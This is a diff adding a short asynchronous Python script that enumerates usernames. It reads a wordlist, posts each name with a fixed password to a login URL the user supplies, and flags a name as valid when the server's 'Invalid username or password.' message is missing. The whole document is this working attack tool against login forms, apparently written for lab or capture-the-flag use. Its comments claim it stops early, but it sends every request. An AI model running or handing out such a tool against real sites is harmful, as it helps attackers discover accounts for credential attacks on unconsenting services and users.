@@ -1,0 +1,25 @@
+import asyncio
+import aiohttp
+
+async def check_username(url, session, username):
+    payload = {'username': username, 'password': 'password'}
+    async with session.post(url, data=payload) as response:
+        if not  "Invalid username or password." in await response.text():
+            print(f"valid username: {username}")
+            return True  # Signal to stop further execution
+
+async def main():
+    url = input("Enter the URL: ")
+    usernames = []
+    with open('username.txt', 'r') as file:
+        usernames = file.read().splitlines()
+
+    async with aiohttp.ClientSession() as session:
+        tasks = [check_username(url, session, username) for username in usernames]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        # If a valid username is found, stop further execution
+        if True in results:
+            print("Valid username found. Stopping further execution.")
+
+if __name__ == "__main__":
+    asyncio.run(main())
